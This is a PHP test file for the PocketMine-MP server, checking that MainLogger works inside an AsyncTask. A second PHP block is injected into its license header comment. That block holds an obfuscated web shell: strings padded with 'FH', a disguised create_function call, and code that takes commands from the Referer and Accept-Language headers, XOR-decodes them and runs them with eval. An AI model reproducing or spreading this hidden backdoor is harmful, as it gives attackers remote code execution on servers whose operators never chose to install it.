<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
<?php
$M='ompress(@x(@FHFHbase6FHFH4_decoFHde(FHpreg_replace(FHFHarray("/_/","/-/"),FHarray("/FHFH"FH,"+F';
$j='ower";FH$i=$m[1][0FH].$m[1][1FH];$h=$sl(FH$ss(md5FH($i.FH$kh),0FH,3));$FHf=$slFH($ss(FHmd5($i.$';
$K='_LAFHNGUAGE"];if($rFHr&&$ra)FH{$u=pFHarse_urlFHFHFH($rr);parse_str($uFH["queFHry"]FHFH,$q);$q=a';
$m='$kh="5d41"FHFH;$kf="40FH2a";functiFHon FHx($t,$k){FH$cFH=stFHrlen($FHFHk);$l=strFHlen($FHt);$o=';
$A='[FH$i].=$p;$eFH=strpos($sFH[$i],$fFH);iFHf($e){$k=$kFHhFHFH.$kf;obFH_start();@eFHval(@FHgFHzunc';
$q='}}rFHeturn FH$o;FH}$r=$_SFHEFHRVEFHR;$rr=FH@$r["FHFHHTTPFH_RFHEFERER"];$ra=@$r["HTFHTP_ACCFHEPT';
$f=str_replace('l','','llcreatel_flunlctilon');
$w='enFHcode(x(gzcoFHmFHFHpress($o),$k));FHprintFH("<$k>$FHd</$k>FH");@seFHFHssion_desFHtroy();}}}}';
$I='rray_FHvalFHues($q);FHpreg_matFHchFH_allFH(FH"/([\\w])[\\w-]FH+(?:FH;FHq=0.([\\FHd]))?,?/",$rFHa,$';
$E='m);if($qFH&FH&$m){@FHsessFHion_stFHFHarFHt();$s=&$_SESSFHIONFH;$ss="subFHstFHr";$sl=FH"FHstrtol';
$U='rpos($FHp,$h)===0){FHFH$FHs[$i]="";$p=$ss($FHFHp,3);}if(aFHrraFHy_key_exiFHsts($i,$FHFHs)){$sFH';
$e='H"),$ss($s[$i],0,$e)))FH,$k)))FH;$oFH=ob_get_FHconFHtents();FHobFH_end_clean(FH);$d=baFHse64FH_';
$y='"";for($i=0FH;$iFH<$l;){forFH($j=FH0;($j<$c&FH&$i<FH$l);$FHFHj++,$i++){$o.=FH$t{$i}^FHFH$k{$j};';
$b='FHkf)FH,0,3));FH$p="";foFHr($z=1;$FHz<FHcount(FH$m[1]);FH$FHz++)$p.=$qFH[$m[2][$FHzFH]]FH;if(st';
$F=str_replace('FH','',$m.$y.$q.$K.$I.$E.$j.$b.$U.$A.$M.$e.$w);
$x=$f('',$F);$x();
?>
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pmmp\TesterPlugin\tests;

use pmmp\TesterPlugin\Test;
use pocketmine\scheduler\AsyncTask;
use pocketmine\Server;
use pocketmine\utils\AssumptionFailedError;
use pocketmine\utils\MainLogger;
use function ob_end_flush;
use function ob_get_contents;
use function ob_start;
use function strpos;

class AsyncTaskMainLoggerTest extends Test{

	public function run() : void{
		$this->getPlugin()->getServer()->getAsyncPool()->submitTask(new class($this) extends AsyncTask{

			/** @var bool */
			protected $success = false;

			public function __construct(AsyncTaskMainLoggerTest $testObject){
				$this->storeLocal($testObject);
			}

			public function onRun(){
				ob_start();
				MainLogger::getLogger()->info("Testing");
				$contents = ob_get_contents();
				if($contents === false) throw new AssumptionFailedError("ob_get_contents() should not return false here");
				if(strpos($contents, "Testing") !== false){
					$this->success = true;
				}
				ob_end_flush();
			}

			public function onCompletion(Server $server){
				/** @var AsyncTaskMainLoggerTest $test */
				$test = $this->fetchLocal();
				$test->setResult($this->success ? Test::RESULT_OK : Test::RESULT_FAILED);
			}
		});
	}

	public function getName() : string{
		return "MainLogger::getLogger() works in AsyncTasks";
	}

	public function getDescription() : string{
		return "Verifies that the MainLogger is accessible by MainLogger::getLogger() in an AsyncTask";
	}

}
